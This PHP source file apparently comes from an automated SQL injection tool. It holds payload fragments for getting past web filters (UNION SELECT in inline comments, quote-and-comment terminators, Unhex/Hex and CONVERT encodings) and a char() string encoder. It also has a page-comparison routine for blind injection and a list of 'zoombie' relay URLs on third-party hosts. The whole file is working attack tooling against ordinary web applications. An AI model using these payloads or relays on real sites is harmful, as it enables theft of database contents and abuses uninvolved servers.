<?php

################ CLEAN UP URL ####################
function cleanUpUrl($url)
{
	$ret = $url;
	$arrCleanUpUrl = array(
	"abc1" => "&");
	$ret = rtrim($ret);
	$ret = ltrim($ret);
	$ret = stripcslashes($ret);
	foreach($arrCleanUpUrl as $key => $value)
	{
		$ret = str_replace($key,$value,$ret);
	}
	return $ret;
}
#################  BYPASS  #######################
$arrSecBypass = array(
	array(" Union All Select ",""),
	array(" Union All (Select ",")"),
	array(" /*! Union All Select ","*/"),
	array(" /*! Union All (Select ",")*/")
	);
$arrCommentBypass = array(
	array("",""),
	array("","--"),
	array("'","--%20a"),
	array("'","/*"),
	array("'","And%20'1'='1"),
	array(")","--%20a"),
	array('"',"--%20a")
	);
function printCommentBypass($arrCommentBypass,$obj)
{
	echo "<select id='".$obj."'>";
	for($i=0;$i<5;$i++)
	{
		echo "<option value='".$arrCommentBypass[$i][1]."'>".urldecode($arrCommentBypass[$i][1])."</option>";
	}
	echo "</select>";
}
$arrEncodeBypass = array (
	array("",""),
	array("Unhex(Hex(","))"),
	array("ConVert(","%20USING%20latin1)")
	);
#####################################################
$arrZoombieDefault = array(	
	"http://viet.ug/yy/test.php",
	"http://sylph-pro.net/test.php"
	//"http://aemobi.com/sale.php",
	//"http://www.vnpremium.com/home/components/com_search/models/test.php"
);
########################################################

class CExploit
{
	public $url;
	public $page;
	public $result;
	public $i;
}
function _urlEncode($url)
{
	$ret = str_replace(" ","%20",$url);
	return $ret;
}
function cleanUpPage($page)
{
	$ret = htmlentities($page);
	$ret = str_replace("=","vndarkcode",$ret);
	$ret = str_replace("(","vndarkcode",$ret);
	$ret = str_replace("'","vndarkcode",$ret);
	//$ret = str_replace("9999","vndarkcode",$ret);
	//$ret = str_replace("10000","vndarkcode",$ret);
	$ret = str_replace(")","vndarkcode",$ret);

	$arr = array("/[\s]/","/http/","/\"/");
	$ret = preg_replace($arr,"",$ret);
	return $ret;
}
function getPage($url)	
{
	$ch=curl_init();
	$agent = "Mozilla/5.0 (Windows; ?; Windows NT 5.1; *rv:*) Gecko/* Firefox/0.9*";
	curl_setopt($ch,CURLOPT_USERAGENT,$agent);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1); 
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_TIMEOUT,10);
	$page=curl_exec($ch);
	curl_close($ch);
	return $page;
}
function check($a1,$a,$a10000)
{
	$d=0;$s=0;
	for($j=0;$j<count($a1);$j++)
	{
		if($a[$j] == $a1[$j] && $a[$j] != $a10000[$j])
			$d++;
		if($a[$j] != $a1[$j] && $a[$j] == $a10000[$j])
			$s++;
	}

	//echo $d;ob_flush();flush();
	if($d > 5 && $d > $s)
		return 1;
	if($s > 5 && $s > $d)
		return -1;
	return 0;
}
function ascii_mysql($str)
{
	$str_array=unpack("C*",$str);
	$return="char%20(".join(",",$str_array).")";
	return $return;
}
function getFileLog($type)
{
	$i = 1;
	while(1)
	{
		$log = $type."_log_".$i.".txt";
		if(!file_exists($log))
		{
			$handle = fopen($log,"a");
			fclose($handle);
			break;		
		}
		else
		{
			if((time()-filemtime($log)) > 60*5)
			{
				unlink($log);
			}
		}
		$i++;
	}
	return $log;
}
?>